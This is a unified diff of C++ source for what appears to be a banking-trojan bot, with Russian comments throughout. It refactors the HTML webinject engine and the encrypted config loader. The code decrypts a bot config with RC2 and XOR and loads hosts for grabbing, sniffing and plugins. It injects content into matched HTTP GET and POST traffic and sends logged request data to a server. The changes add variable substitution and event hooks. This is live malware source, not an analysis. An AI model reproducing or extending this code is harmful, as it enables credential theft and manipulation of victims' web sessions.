@@ -10,6 +10,7 @@
 #include "Crypt.h"
 #include "BotUtils.h"
 #include "Loader.h"
+#include "BotDef.h"
 
 #include "Modules.h"
 
@@ -110,199 +111,214 @@ void HTMLInjectSetSystemVariables(THTMLInjectData *Data)
 	STR::Free(BotID);
 }
 
+
+// Устанавливаем значение из списка переменных
+void SetValuesFromVariables(TValues* Values, THTMLInjectData *Data)
+{
+	int Count = Values->Count();
+	for (int i = 0; i < Count; i++)
+	{
+		TValue* V = Values->Items(i);
+		HTMLInjectSetVariableValue(Data, V->Name.t_str(), V->Value.t_str());
+	}
+}
+
 // ----------------------------------------------------------------------------
 
 
-PCHAR ReadStrBlock_(PCHAR &Buf)
-{
-	// Функция читаем строку из буфера и смещает указатель за строку
-	// формат буфера (DWORD - Длина строки)(Строка)
-	DWORD Size = *(DWORD*)Buf;
-	Buf += sizeof(DWORD);
-	if (Size == 0)
-		return NULL;
-	PCHAR Str = STR::New(Buf, Size);
-	Buf += Size;
-	return Str;
-}
-
-void ReadStrBlock_(PCHAR &Buf, string &Out)
-{
-	// Функция читаем строку из буфера и смещает указатель за строку
-	// формат буфера (DWORD - Длина строки)(Строка)
-	DWORD Size = *(DWORD*)Buf;
-	Buf += sizeof(DWORD);
-	if (Size == 0) return;
-
-	Out.Copy(Buf, 0, Size);
-
-	Buf += Size;
-}
+//PCHAR ReadStrBlock_(PCHAR &Buf)
+//{
+//	// Функция читаем строку из буфера и смещает указатель за строку
+//	// формат буфера (DWORD - Длина строки)(Строка)
+//	DWORD Size = *(DWORD*)Buf;
+//	Buf += sizeof(DWORD);
+//	if (Size == 0)
+//		return NULL;
+//	PCHAR Str = STR::New(Buf, Size);
+//	Buf += Size;
+//	return Str;
+//}
 
 
-
-bool DoLoadConfigFromFileEx(TBotConfig* Config, PWCHAR FileName)
-{
-
-	// Загрухить конфигурационный файл
-
-	Config->HTMLInjects->Clear();
-
-	CFGDBG("BotConfig", "Загружаем файл");
-
-	HANDLE File = (HANDLE)pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ,
-		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-
-	if (File == INVALID_HANDLE_VALUE)
-	{
-		CFGDBG("BotConfig", "Ошибка загрузки файла!");
-		return false;
-	}
-
-	DWORD ID = 0;
-	DWORD h = 0;
-	DWORD FileSize = (DWORD)pGetFileSize(File, &h);
-	LPBYTE FileBuf = (LPBYTE)MemAlloc(FileSize + 1);
-	if (FileBuf == NULL)
-	{
-		pCloseHandle(File);
-		return false;
-	}
-
-	m_memset(FileBuf, 0, FileSize + 1);
-
-	DWORD Readed = 0;
-	if (!pReadFile(File, FileBuf, FileSize, &Readed, NULL))
-	{
-		MemFree(FileBuf);
-		pCloseHandle(File);
-		return false;
-	}
+//void ReadStrBlock_(PCHAR &Buf, string &Out)
+//{
+//	// Функция читаем строку из буфера и смещает указатель за строку
+//	// формат буфера (DWORD - Длина строки)(Строка)
+//	DWORD Size = *(DWORD*)Buf;
+//	Buf += sizeof(DWORD);
+//	if (Size == 0) return;
+//
+//	Out.Copy(Buf, 0, Size);
+//
+//	Buf += Size;
+//}
 
 
-	// Проверяем фвляется ли файл конфигом
 
-	if (!Config::IsConfig((PCHAR)FileBuf))
-	{
-		PCHAR Password = GetMainPassword();
-		RC2Crypt::Decode(Password, (PCHAR)FileBuf, FileSize);
-		STR::Free(Password);
 
-		if (!Config::IsConfig((PCHAR)FileBuf))
-		{
-			MemFree(FileBuf);
-			pCloseHandle(File);
-			return false;
-        }
-	}
+//bool DoLoadConfigFromFileEx(TBotConfig* Config, PWCHAR FileName)
+//{
+//
+//	// Загрухить конфигурационный файл
+//
+//	Config->HTMLInjects->Clear();
+//
+//	CFGDBG("BotConfig", "Загружаем файл");
+//
+//	HANDLE File = (HANDLE)pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ,
+//		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+//
+//	if (File == INVALID_HANDLE_VALUE)
+//	{
+//		CFGDBG("BotConfig", "Ошибка загрузки файла!");
+//		return false;
+//	}
+//
+//	DWORD ID = 0;
+//	DWORD h = 0;
+//	DWORD FileSize = (DWORD)pGetFileSize(File, &h);
+//	LPBYTE FileBuf = (LPBYTE)MemAlloc(FileSize + 1);
+//	if (FileBuf == NULL)
+//	{
+//		pCloseHandle(File);
+//		return false;
+//	}
+//
+//	m_memset(FileBuf, 0, FileSize + 1);
+//
+//	DWORD Readed = 0;
+//	if (!pReadFile(File, FileBuf, FileSize, &Readed, NULL))
+//	{
+//		MemFree(FileBuf);
+//		pCloseHandle(File);
+//		return false;
+//	}
+//
+//
+//	// Проверяем фвляется ли файл конфигом
+//
+//	if (!Config::IsConfig((PCHAR)FileBuf))
+//	{
+//		PCHAR Password = GetMainPassword();
+//		RC2Crypt::Decode(Password, (PCHAR)FileBuf, FileSize);
+//		STR::Free(Password);
+//
+//		if (!Config::IsConfig((PCHAR)FileBuf))
+//		{
+//			MemFree(FileBuf);
+//			pCloseHandle(File);
+//			return false;
+//        }
+//	}
+//
+//	// Читаем данные
+//	PCHAR Buf = (PCHAR)XORCrypt::DecodeBuffer
+//		((PCHAR)ConfigSignature, FileBuf, Readed);
+//	if (Buf == NULL)
+//	{
+//		pCloseHandle(File);
+//		return false;
+//	}
+//
+//	// Пропускаем один устаревший параметр размером один байт
+//	Buf++;
+//
+//	// определяем количество масок
+//	DWORD Count = *(DWORD*)Buf;
+//	Buf += sizeof(DWORD);
+//
+//	// Загружаем информацию о хостах
+//
+//	FgrHostFromCfg = ReadStrBlock_(Buf);
+//	GraHostFromCfg = ReadStrBlock_(Buf);
+//	ScrHostFromCfg = ReadStrBlock_(Buf);
+//	SniHostFromCfg = ReadStrBlock_(Buf);
+//	PluginsHostFromCfg = ReadStrBlock_(Buf);
+//
+//	// Период обновления конфига
+//	TimeOut = *(DWORD*)Buf;
+//	Buf += sizeof(DWORD);
+//
+//	// ------------- Настройки протоколов -------------//
+//	bHttp = *Buf != 0;
+//	Buf++;
+//
+//	bHttps = *Buf != 0;
+//	Buf++;
+//
+//	// ------------- Загружаем данные инжектов -------------//
+//	THTMLInject *Inject;
+//	THTMLInjectData *Data;
+//	DWORD DataCount;
+//	DWORD Mode;
+//
+//	for (DWORD i = 0; i < Count; i++)
+//	{
+//		Inject = Config->HTMLInjects->AddInject();
+//		if (Inject == NULL)
+//			break;
+//
+//		ID++;
+//		Inject->ID = ID;
+//		// Читаем маску инжекта
+//		Inject->URL = ReadStrBlock_(Buf);
+//
+//		// Читаем режимы обработки
+//		Mode = *(DWORD*)Buf;
+//		Buf += sizeof(DWORD);
+//
+//		// Декодируем старую версию флага
+//		Inject->GET = (Mode == 1 || Mode == 3 || Mode == 4 || Mode == 6);
+//		Inject->POST = (Mode == 2 || Mode == 3 || Mode == 5 || Mode == 6);
+//		Inject->IsLog = (Mode <= 3);
+//
+//		DataCount = *(DWORD*)Buf;
+//		Buf += sizeof(DWORD);
+//
+//		for (DWORD j = 0; j < DataCount; j++)
+//		{
+//			Data = Inject->AddData();
+//			if (Data == NULL)
+//				break;
+//
+//			ID++;
+//			Data->ID = ID;
+//			ReadStrBlock_(Buf, Data->Before);
+//			ReadStrBlock_(Buf, Data->Inject);
+//			ReadStrBlock_(Buf, Data->After);
+//
+////			Data->Before = ReadStrBlock_(Buf);
+////			Data->Inject = ReadStrBlock_(Buf);
+////			Data->After = ReadStrBlock_(Buf);
+//
+//			if (!Data->Before.IsEmpty())
+//				Data->MacrosHash = Data->Before.Hash();
+//				;
+//
+//			// В рабочем боте подменяем переменные в момент загрузки конфига
+//			#ifndef BV_APP
+//				HTMLInjectSetSystemVariables(Data);
+//			#endif
+//
+//		}
+//	}
+//	MemFree(FileBuf);
+//
+//	// Получаем время изменения файла
+////	FILETIME Tm;
+////	pGetFileTime(File, &Tm, &Tm, &Config->ConfigTime);
+//
+//	// -------------------------------
+//	pCloseHandle(File);
+//
+//	CFGDBG("BotConfig", "Файл загружен");
+//
+//	// Сохраняем имя последнего загруженного файла
+////	Config->LastConfigFile = WSTR::New(FileName);
+//
+//	return true;
+//}
 
-	// Читаем данные
-	PCHAR Buf = (PCHAR)XORCrypt::DecodeBuffer
-		((PCHAR)ConfigSignature, FileBuf, Readed);
-	if (Buf == NULL)
-	{
-		pCloseHandle(File);
-		return false;
-	}
-
-	// Пропускаем один устаревший параметр размером один байт
-	Buf++;
-
-	// определяем количество масок
-	DWORD Count = *(DWORD*)Buf;
-	Buf += sizeof(DWORD);
-
-	// Загружаем информацию о хостах
-
-	FgrHostFromCfg = ReadStrBlock_(Buf);
-	GraHostFromCfg = ReadStrBlock_(Buf);
-	ScrHostFromCfg = ReadStrBlock_(Buf);
-	SniHostFromCfg = ReadStrBlock_(Buf);
-	PluginsHostFromCfg = ReadStrBlock_(Buf);
-
-	// Период обновления конфига
-	TimeOut = *(DWORD*)Buf;
-	Buf += sizeof(DWORD);
-
-	// ------------- Настройки протоколов -------------//
-	bHttp = *Buf != 0;
-	Buf++;
-
-	bHttps = *Buf != 0;
-	Buf++;
-
-	// ------------- Загружаем данные инжектов -------------//
-	THTMLInject *Inject;
-	THTMLInjectData *Data;
-	DWORD DataCount;
-	DWORD Mode;
-
-	for (DWORD i = 0; i < Count; i++)
-	{
-		Inject = Config->HTMLInjects->AddInject();
-		if (Inject == NULL)
-			break;
-
-		ID++;
-		Inject->ID = ID;
-		// Читаем маску инжекта
-		Inject->URL = ReadStrBlock_(Buf);
-
-		// Читаем режимы обработки
-		Mode = *(DWORD*)Buf;
-		Buf += sizeof(DWORD);
-
-		// Декодируем старую версию флага
-		Inject->GET = (Mode == 1 || Mode == 3 || Mode == 4 || Mode == 6);
-		Inject->POST = (Mode == 2 || Mode == 3 || Mode == 5 || Mode == 6);
-		Inject->IsLog = (Mode <= 3);
-
-		DataCount = *(DWORD*)Buf;
-		Buf += sizeof(DWORD);
-
-		for (DWORD j = 0; j < DataCount; j++)
-		{
-			Data = Inject->AddData();
-			if (Data == NULL)
-				break;
-
-			ID++;
-			Data->ID = ID;
-			ReadStrBlock_(Buf, Data->Before);
-			ReadStrBlock_(Buf, Data->Inject);
-			ReadStrBlock_(Buf, Data->After);
-
-//			Data->Before = ReadStrBlock_(Buf);
-//			Data->Inject = ReadStrBlock_(Buf);
-//			Data->After = ReadStrBlock_(Buf);
-
-			if (!Data->Before.IsEmpty())
-				Data->MacrosHash = Data->Before.Hash();
-				;
-
-			// В рабочем боте подменяем переменные в момент загрузки конфига
-			#ifndef BV_APP
-				HTMLInjectSetSystemVariables(Data);
-			#endif
-
-		}
-	}
-	MemFree(FileBuf);
-
-	// Получаем время изменения файла
-//	FILETIME Tm;
-//	pGetFileTime(File, &Tm, &Tm, &Config->ConfigTime);
-
-	// -------------------------------
-	pCloseHandle(File);
-
-	CFGDBG("BotConfig", "Файл загружен");
-
-	// Сохраняем имя последнего загруженного файла
-//	Config->LastConfigFile = WSTR::New(FileName);
-
-	return true;
-}
 // ----------------------------------------------------------------------------
 
 //bool Config::LoadConfigFromFile(TBotConfig *Config, PWCHAR FileName)
@@ -368,16 +384,18 @@ bool DoLoadConfigFromFileEx(TBotConfig* Config, PWCHAR FileName)
 
 // ----------------------------------------------------------------------------
 
-void FreeHTMLInjectData(LPVOID Data)
-{
-	// Уничтожить данные HTML инжекта
-	delete (THTMLInjectData*)Data;
-}
+//void FreeHTMLInjectData(LPVOID Data)
+//{
+//	// Уничтожить данные HTML инжекта
+//	delete (THTMLInjectData*)Data;
+//}
 
-void HTMLInjects::FreeInject(THTMLInject *Inject)
-{
-	// Заглушка
-}
+
+//void HTMLInjects::FreeInject(THTMLInject *Inject)
+//{
+//	// Заглушка
+//}
+
 
 
 // ----------------------------------------------------------------------------
@@ -860,18 +878,21 @@ bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
 	DWORD Count = Inject->Count();
 	bool Injected; // Признак того, что был произведён хотя-бы один инжект
 
+
+
 	PCHAR BotID = GenerateBotID();
+
+    THTMLInjectData Data(NULL);
 
 	for (DWORD i = 0; i < Count; i++)
 	{
-		THTMLInjectData *SourceData = Inject->Items(i);
+	   	THTMLInjectData *SourceData = Inject->Items(i);
 
 		// Отключенные данные игнорируем
 		if (SourceData->Disabled) continue;
 
 		// Перед инжектом копируем данные, т.к. некоторые
 		// инжекты могут содержать макросы подмены
-		THTMLInjectData Data(NULL);
 		Data.Copy(*SourceData);
 
 		#ifdef BV_APP
@@ -880,11 +901,13 @@ bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
 		#endif
 
 
+        SetValuesFromVariables(Config::GetConfig()->HTMLInjects->Variables, &Data);
+
 		Injected  = false;
 		NewBuffer = NULL;
 		NewLen    = 0;
 
-		if (Data.MacrosHash == 0)
+	   	if (Data.MacrosHash == 0)
 		{
 			Data.MacrosHash = Data.Before.Hash();
 			SourceData->MacrosHash = Data.MacrosHash;
@@ -962,11 +985,14 @@ bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session) {
 	Request->Injected = true; // Устанавливаем признак обработанных инжектов
 
 	bool Result = false;
-	THTMLInject *Inject;
 	DWORD Count = List::Count(Request->Injects);
 
-	for (DWORD i = 0; i < Count; i++) {
-		Inject = (THTMLInject*)List::GetItem(Request->Injects, i);
+	for (DWORD i = 0; i < Count; i++)
+	{
+		THTMLInject *Inject = (THTMLInject*)List::GetItem(Request->Injects, i);
+
+		Inject->CallEvent(BOT_EVENT_HTMLINJECT_EXECUTE);
+
 		if (Inject->IsLog)
 			SendHTMLLogToServer((PCHAR)Request->Buffer, Inject, Session);
 		else
@@ -1029,28 +1055,21 @@ bool HTMLInjects::SupportContentType(PCHAR CType) {
 //*****************************************************************************
 
 THTMLInjectList::THTMLInjectList()
+    : TBotCollection(), TEventContainer()
 {
-	FInjects = List::Create();
-	pInitializeCriticalSection(&FLock);
+	// Включаем потоко-защищённый режим
+	SetThreadSafe();
+	Variables = new TValues();
+    Variables->SetThreadSafe();
+
 }
 
 THTMLInjectList::~THTMLInjectList()
 {
-	Clear();
-	List::Free(FInjects);
+	delete Variables;
 }
 
 
-void THTMLInjectList::Lock()
-{
-	pEnterCriticalSection(&FLock);
-}
-
-
-void THTMLInjectList::Unlock()
-{
-	pLeaveCriticalSection(&FLock);
-}
 
 THTMLInject* THTMLInjectList::AddInject()
 {
@@ -1060,6 +1079,9 @@ THTMLInject* THTMLInjectList::AddInject()
 
 void THTMLInjectList::ResetInjectsStatus()
 {
+	// Функция сбрасывает статус инжектов
+	TLock L = GetLocker();
+
 	int C = Count();
 	for (int i = 0; i < C; i++)
 	{
@@ -1072,25 +1094,16 @@ void THTMLInjectList::ResetInjectsStatus()
 	}
 }
 
-void THTMLInjectList::Clear()
-{
-	// Функция очищает список инжектов
-	for (DWORD i = List::Count(FInjects); i > 0; i--)
-		delete (THTMLInject*)List::GetItem(FInjects, i);
-
-}
-
 
 bool THTMLInjectList::LoadFromMem(LPVOID Buf, DWORD BufSize)
 {
 	// Читаем инжекты из блока памяти
 
 	// Входим в критическую секцию
-	TLock Lock(&FLock);
+	TLock L = GetLocker();
 
 	//------------------------------------
-	Clear();
-	if (!Buf || !BufSize) return false;
+	Clear();;
 
     return false;
 	//------------------------------------
@@ -1098,30 +1111,38 @@ bool THTMLInjectList::LoadFromMem(LPVOID Buf, DWORD BufSize)
 }
 
 
+void THTMLInjectList::Clear()
+{
+	// Очистку списка проводим с учётом того, что инжекты в данный момент
+	// могут использоваться в запросах. По этому извлекаем их из коллекции
+	// и уменьшаем счётчик ссылок
+
+	TLock L = GetLocker();
+
+    CallEvent(BOT_EVENT_HTMLINJECTS_CLEAR);
+
+	while (Count())
+	{
+		THTMLInject *Item = Items(0);
+		Item->SetOwner(NULL);
+		Item->Release();
+    }
+}
+
+
 void THTMLInjectList::ReleaseInjects(PList Injects)
 {
 	// Функция освобождает список инжектов
-	if (!Injects)
-		Injects = FInjects;
-
-	bool IsSelfList = Injects == FInjects;
+	if (!Injects) return;
 
     // Входим в критическую секцию
-	TLock Lock(&FLock);
+	TLock L = GetLocker();
 	//----------------------------
 
-
-	for (DWORD i = List::Count(Injects); i > 0; i--)
+	int Cnt = List::Count(Injects);
+	for (int i = 0; i < Cnt; i++)
 	{
-		THTMLInject *Inject = (THTMLInject*)List::GetItem(Injects, i);
-		if (!Inject) break;
-
-		// Если удаляется из собственного списка то
-		// обнуляем владельца
-		if (IsSelfList)
-            Inject->FOwner = NULL;
-
-        Inject->Release();
+		((THTMLInject*)List::GetItem(Injects, i))->Release();;
 	}
 
 	List::Clear(Injects);
@@ -1142,7 +1163,7 @@ bool THTMLInjectList::GetInjectsForURL(THTTPMethod Method, const char *URL, PLis
     bool Result = false;
 
 	// Входим в критическую секцию
-	TLock Lock(&FLock);
+	TLock L = GetLocker();
 
 	//-----------------------------
 
@@ -1170,7 +1191,8 @@ bool THTMLInjectList::GetInjectsForURL(THTTPMethod Method, const char *URL, PLis
 			if (List == NULL) break;
 
 			// Добавляем в список
-			Inject->Used = true;
+			Inject->Activated = true;
+			Inject->CallEvent(BOT_EVENT_HTMLINJECT_ACTIVATED);
 
 			List::Add(List, Inject);
 			Inject->AddRef();
@@ -1215,20 +1237,15 @@ bool THTMLInjectList::IsInjectURL(const char* URL, THTTPMethod Method)
 
 
 THTMLInject::THTMLInject(THTMLInjectList *aOwner)
+	: TBotCollectionItem(aOwner), TEventContainer()
 {
-	FOwner = aOwner;
-	if (FOwner)
-		List::Add(FOwner->FInjects, this);
-	FInjects = List::Create();
+	FItems    = new TBotCollection();
 	FRefCount = 1;
 }
 
 THTMLInject::~THTMLInject()
 {
-	if (FOwner)
-		List::Remove(FOwner->FInjects, this);
-    Clear();
-	List::Free(FInjects);
+	delete FItems;
 }
 
 
@@ -1247,16 +1264,26 @@ void THTMLInject::Release()
 }
 
 
+
 THTMLInjectData* THTMLInject::AddData()
 {
 	return new THTMLInjectData(this);
 }
 
-void THTMLInject::Clear()
+// Функция возвращает истину если хотя-бы в одном инжекте
+// содержится имя переменной
+int THTMLInject::ContainVariable(const char* VarName)
 {
-	// Функция очищает список инжектов
-	for (DWORD i = List::Count(FInjects); i > 0; i--)
-		delete (THTMLInjectData*)List::GetItem(FInjects, i);
+	int Count = FItems->Count();
+	for (int i = 0; i < Count; i++)
+	{
+		THTMLInjectData* D = Items(i);
+		if (D->Before.Pos(VarName) >= 0 ||
+			D->Inject.Pos(VarName) >= 0 ||
+			D->After.Pos(VarName) >= 0 ) return true;
+	}
+
+	return false;
 }
 
 //*****************************************************************************
@@ -1264,18 +1291,12 @@ void THTMLInject::Clear()
 //*****************************************************************************
 
 THTMLInjectData::THTMLInjectData(THTMLInject *aOwner)
+	: TBotCollectionItem(NULL), TEventContainer()
 {
 	FOwner = aOwner;
 	if (FOwner)
-		List::Add(FOwner->FInjects, this);
+		SetOwner(FOwner->FItems);
 }
-
-THTMLInjectData::~THTMLInjectData()
-{
-	if (FOwner)
-		List::Remove(FOwner->FInjects, this);
-}
-
 
 void THTMLInjectData::Copy(const THTMLInjectData &Data)
 {
@@ -1310,7 +1331,6 @@ TBotConfig::TBotConfig()
 	HTMLInjects = new THTMLInjectList();
 }
 
-
 TBotConfig::~TBotConfig()
 {
 	delete HTMLInjects;
@@ -1329,7 +1349,7 @@ bool TBotConfig::LoadFromFile(const string &FileName)
 	// Функция загружает настройки из файла
 
 	// Входим в критичскую секцию
-    TLock Lock(&HTMLInjects->FLock);
+    TLock Lock = HTMLInjects->GetLocker();
 	//------------------------------
 
 	Clear();
@@ -1347,6 +1367,9 @@ bool TBotConfig::LoadFromFile(const string &FileName)
 
 	// Освобождаем память
 	MemFree(Buf);
+
+	// Вызываем событие
+    HTMLInjects->CallEvent(BOT_EVENT_HTMLINJECTS_LOADED);
 
 	return Result;
 
@@ -1398,7 +1421,7 @@ bool TBJBConfigReader::Read(TBotConfig* Config)
 	// ------------- Загружаем данные инжектов -------------//
 	THTMLInject *Inject;
 	THTMLInjectData *Data;
-	DWORD ID;
+	DWORD ID = 0;
 
 	for (DWORD i = 0; i < Count; i++)
 	{
